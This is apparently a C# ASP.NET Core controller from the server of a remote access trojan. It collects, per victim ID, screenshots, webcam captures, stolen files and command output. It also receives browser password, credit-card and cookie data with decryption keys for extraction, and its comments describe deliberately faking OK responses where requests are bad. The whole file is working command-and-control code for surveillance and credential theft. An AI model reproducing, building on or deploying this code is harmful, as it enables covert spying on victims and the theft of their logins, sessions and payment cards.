﻿using Microsoft.AspNetCore.Mvc;
using X_ZIGZAG_SERVER_WEB_API.Filters;
using X_ZIGZAG_SERVER_WEB_API.Interfaces;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Request;

namespace X_ZIGZAG_SERVER_WEB_API.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class ResponseController : ControllerBase
    {
        private readonly IResponseService responseService;

        public ResponseController(IResponseService responseService)
        {
            this.responseService = responseService;
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("{uuid}")]
        public async Task<IActionResult> GetAllResponse(string uuid)
        {
            var result = await responseService.GetAllResponse(uuid);
            if (result == null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [HttpPost("Image/{uuid}/{screenIndex}")]
        public async Task<IActionResult> ReceiveImage(string uuid, int screenIndex)
        {
            // We Return False Info because we are 100% the Client Should send the image without any problems + JPEG Format
                if (Request.ContentLength == null || Request.ContentLength == 0)
                {
                    // False Info (BadRequest)
                    return Ok();
                }
                using var memoryStream = new MemoryStream();
                await Request.Body.CopyToAsync(memoryStream);
                byte[] imageData = memoryStream.ToArray();
                await responseService.StoreScreenshot(uuid, screenIndex, imageData);
                return Ok();
        }
        [HttpPost("Webcam/{uuid}/{instructionId}")]
        public async Task<IActionResult> ReceiveWebcamImage(string uuid,long instructionId)
        {
            // We Return False Info because we are 100% the Client Should send the image without any problems + JPEG Format
            if (Request.ContentLength == null || Request.ContentLength == 0)
            {
                // False Info (BadRequest)
                return Ok();
            }
            using var memoryStream = new MemoryStream();
            await Request.Body.CopyToAsync(memoryStream);
            byte[] imageData = memoryStream.ToArray();
            await responseService.StoreWebcam(uuid,1, imageData, instructionId);
            return Ok();
        }
        [HttpPost("File/{uuid}/{instructionId}")]
        public async Task<IActionResult> ReceiveFile(string uuid,long instructionId)
        {
            if (!Request.Form.Files.Any())
                return Ok(); // Fake (BadRequest)

            var file = Request.Form.Files.FirstOrDefault();
            if (file == null || file.Length == 0)
                return Ok();// Fake (BadRequest)
            await responseService.StoreFile(uuid, instructionId, file);
            return Ok();
        }
        [HttpPost("{uuid}/{instructionId}")]
        public async Task<IActionResult> ResponseOutput(string uuid, long instructionId,[FromBody] ResponseNotifyVM ResponseNotify)
        {
            await responseService.ResponseOutput(uuid, instructionId, ResponseNotify.output);
            return Ok();
        }
        [HttpPost("Browser/Password/{uuid}/{instructionId}")]
        public async Task<IActionResult> BrowserPassword(string uuid,long instructionId,[FromBody] BrowserPasswordVM pass)
        {
            if (!ModelState.IsValid)
            {
                Ok(); // Fake (Bad Request)
            }
            byte[] Data = Convert.FromBase64String(pass.Data);
            byte[] Key = Convert.FromBase64String(pass.Key);
            await responseService.BrowserPasswordExtracting(uuid, instructionId, Data, Key, pass.Browser);
            return Ok();
        }
        [HttpPost("Browser/CreditCard/{uuid}/{instructionId}")]
        public async Task<IActionResult> BrowserCards(string uuid, long instructionId, [FromBody] BrowserPasswordVM pass)
        {
            if (!ModelState.IsValid)
            {
                Ok();  // Fake (Bad Request)
            }
            byte[] Data = Convert.FromBase64String(pass.Data);
            byte[] Key = Convert.FromBase64String(pass.Key);
            await responseService.BrowserCreditCardExtracting(uuid, instructionId, Data, Key, pass.Browser);
            return Ok();
        }
        [HttpPost("Browser/Cookies/{uuid}/{instructionId}")]
        public async Task<IActionResult> BrowserCookies(string uuid, long instructionId, [FromBody] BrowserPasswordVM pass)
        {
            if (!ModelState.IsValid)
            {
                Ok();  // Fake (Bad Request)
            }
            byte[] Data = Convert.FromBase64String(pass.Data);
            byte[] Key = Convert.FromBase64String(pass.Key);
            await responseService.BrowserCookiesExtracting(uuid, instructionId, Data, Key, pass.Browser);
            return Ok();
        }
    }
}
